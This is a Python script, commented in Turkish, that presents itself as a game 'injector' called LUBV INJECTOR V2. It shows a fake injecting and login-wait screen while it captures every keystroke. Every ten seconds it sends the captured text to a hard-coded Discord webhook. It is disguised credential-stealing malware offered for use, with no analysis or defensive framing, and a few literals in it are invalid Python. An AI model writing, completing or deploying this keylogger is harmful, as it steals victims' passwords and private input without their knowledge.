import os
import sys
import time
import keyboard
import requests
import threading
from ctypes import windll, c_int, byref

# Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1530209712530919545/25UT60IatbSsawIaJVCW8wAosNEdr9e_JvOJX8mZnpA_yEi1Wo_VrkhhMUuYAXPWJGCs"

# CMD'yi büyüt ve renk ayarla
def setup_cmd():
    # Tam ekran yap
    windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), 3)
    # Renk ayarla - 0A = yeşil, 0C = kırmızı, 0E = sarı
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0E)
    # Başlık
    os.system("title LUBV INJECTOR V2")
    # Font boyutunu büyüt
    os.system("mode con: cols=100 lines=30")

# Büyük ASCII Sanatı ile SİNAN yaz
def print_big_sinan():
    os.system("cls")
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0C)
    sinan_art = """
    ███████╗██╗███╗   ██╗ █████╗ ███╗   ██╗
    ██╔════╝██║████╗  ██║██╔══██╗████╗  ██║
    ███████╗██║██╔██╗ ██║███████║██╔██╗ ██║
    ╚════██║██║██║╚██╗██║██╔══██║██║╚██╗██║
    ███████║██║██║ ╚████║██║  ██║██║ ╚████║
    ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """
    print(sinan_art)
    time.sleep(1)
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0A)
    print("\n\n\t\t[ INJECTING... You need to start the game. ]")
    time.sleep(2)
    windll.kernel32.SetConsoleTextAttribute(windll.kernel32.GetConsoleWindow(), 0E)
    print("\n\t\t>> Waiting for login...")

# Keylogger - kaydedilen tuşları webhook'a gönder
log_text = ""
def on_key(event):
    global log_text
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            log_text += " "
        elif event.name == "enter":
            log_text += "\n"
        elif event.name == "backspace":
            log_text = log_text[:-1]
        elif len(event.name) == 1:
            log_text += event.name
        elif event.name.startswith("key"):
            pass
        else:
            log_text += f"[{event.name}]"

# Webhook gönderimi
def send_to_webhook():
    global log_text
    while True:
        time.sleep(10)
        if log_text.strip():
            data = {"content": f"```\n{log_text}\n```"}
            try:
                requests.post(WEBHOOK_URL, json=data)
                log_text = ""
            except:
                pass

# Çalıştır
setup_cmd()
print_big_sinan()
keyboard.on_press(on_key)

# Webhook gönderici thread
thread = threading.Thread(target=send_to_webhook, daemon=True)
thread.start()

# Sonsuz döngü
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass
